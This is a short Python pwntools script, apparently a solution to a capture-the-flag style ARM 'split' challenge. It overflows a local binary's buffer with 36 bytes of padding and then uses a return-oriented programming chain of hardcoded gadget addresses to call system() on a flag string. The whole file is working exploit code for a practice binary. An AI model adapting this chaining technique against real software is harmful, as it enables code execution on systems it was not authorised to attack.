from pwn import *
import os

context.binary = elf = ELF('./split_armv5')

offset = 36
call_system = 0x105e0
mov_r0_r7_blx_r3 = 0x10634
pop_r4_r5_r6_r7_r8_sb_sl_pc = 0x10644
flag_string = 0x2103c
pop_r3_pc = 0x000103a4

payload = b'f'*offset
payload += p32(pop_r3_pc) # because after with a gadget blx r3 
payload += p32(call_system)
# here after all pop jump to pc!
payload += p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)
payload += p32(0x4) # r4
payload += p32(0x5) # r5
payload += p32(0x6) # r6
payload += p32(flag_string) ## r7 then moved to r0
payload += p32(0x8) # r8
payload += p32(0x9) # sb
payload += p32(0xaa)# sl
payload += p32(mov_r0_r7_blx_r3) # pc so jump here and then into system

p = elf.process()
#p = gdb.debug('./split_armv5')


p.recv()
p.sendline(payload)
log.info(p.recvall())
